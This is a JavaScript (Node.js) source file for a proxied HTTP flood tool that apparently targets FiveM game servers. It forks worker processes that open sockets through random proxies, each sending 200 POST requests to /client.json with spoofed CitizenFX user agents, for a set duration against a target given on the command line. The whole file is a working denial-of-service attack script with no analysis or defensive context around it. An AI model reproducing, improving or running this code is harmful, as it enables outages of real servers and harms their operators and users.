const url = require('url'),
net = require('net'),
fs = require('fs'),
cluster = require('cluster'),
referer = require('rand-referer');

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'],
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];

process.on('uncaughtException', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).on('unhandledRejection', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).on('warning', e => {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).setMaxListeners(0);

const target = process.argv[2],
time = process.argv[3],
thread = process.argv[4],
proxylist = process.argv[5],
proxysss = fs.readFileSync(proxylist, 'utf-8').toString().match(/\S+/g);

const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
],
lang_header = [
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5'
],
encoding_header = [
    'deflate, gzip;q=1.0, *;q=0.5',
    'gzip, deflate, br',
    '*'
],
uaslist = [
    "CitizenFX/Five",
    "CitizenFX/1",
    "citizenfx/fivem FxDK"

],
controle_header = [
    'no-cache',
    'no-store',
    'no-transform',
    'max-age=0',
    'must-revalidate'
];

function randomproxy() {
    return proxysss[Math.floor(Math.random() * proxysss.length)]
}

function accept() {
    return accept_header[Math.floor(Math.random() * accept_header.length)];
}

function lang() {
    return lang_header[Math.floor(Math.random() * lang_header.length)];
}

function encoding() {
    return encoding_header[Math.floor(Math.random() * encoding_header.length)];
}

function controling() {
    return controle_header[Math.floor(Math.random() * controle_header.length)];
}

var parsed = url.parse(target);

function fakeua() {
    return uaslist[Math.floor(Math.random() * uaslist.length)];
}

class socket_settings {

    constructor(sss) {

        this.useragent = fakeua();
        this.referer = target+ "players.json";
        this.accept = accept();
        this.lang = lang();
        this.encode = encoding();
        this.controling = controling();
        this.path = "/client.json"
        this.version = 'HTTP/1.3';

    }

    start(socket) {

        for(var n = 0; n < 200; n++) {


            socket.write(`POST ${this.path} ${this.version}\r\nHost: ${parsed.host}\r\nAccept: ${this.accept}\r\nAccept-Encoding: ${this.encode}\r\nAccept-Language: ${this.lang}\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: ${this.controling}\r\nPragma: ${this.controling}\r\nUser-Agent: ${this.useragent}\r\nConnection: Keep-Alive\r\nReferer: ${this.referer}'\r\n\r\n`)
                

        }

    }

}

if(cluster.isMaster) {


    setTimeout(() => {
        process.exit(-1)
    }, time *1000)
    
    console.log('Attack start')

    for(var e = 0; e< thread; e++) {
        cluster.fork()
    }

}else {

    console.log('done')

    function socketsender() {

        var proxy = randomproxy();
        proxy = proxy.split(':');

        var socket = new net.Socket();
        var settings = new socket_settings();

        var ss = socket.connect(proxy[1], proxy[0]);

        ss.on('disconnect', () => {
            console.log('Disconnect');
        })

        ss.on('connect', () => {
            settings.start(ss)
        })

        ss.on('end', () => {
            ss.resume();
            ss.end();
        })

    }

    setInterval(socketsender);

}
